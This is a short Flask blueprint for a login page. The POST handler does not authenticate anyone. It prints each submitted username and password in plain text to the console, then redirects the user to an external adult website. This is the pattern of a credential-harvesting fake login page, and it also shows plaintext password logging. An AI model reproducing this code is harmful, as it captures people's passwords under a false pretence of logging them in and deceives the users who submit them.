from flask import Blueprint, render_template,request,redirect,url_for

auth = Blueprint('auth', __name__)

@auth.route('/')

def login():
    return render_template('login.html')  # Ensure login.html exists inside 'templates' folder


@auth.route('/',methods=['POST'])

def login_post():
    email  =  request.form.get('username')
    password  =  request.form.get('password')

    print(email+":"+password)

    return redirect("https://www.pornhub.com")  # ✅ Correct for external links
    # return redirect(url_for('auth.login'))  # ✅ Correct if 'auth.login' exists


